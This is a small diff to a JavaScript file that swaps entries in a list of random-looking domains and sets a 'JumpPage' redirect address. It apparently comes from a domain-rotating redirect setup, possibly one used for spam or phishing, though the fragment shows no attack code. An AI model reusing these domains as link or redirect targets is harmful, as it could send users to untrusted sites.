@@ -37,8 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'rtmptwcvv.cc/',  
-    'gunskjtnt.com/',
+	'im06z19q.cc',
 ];                                                                                                                  
 
 var JumpPage="https://wboyxymwl.cc";
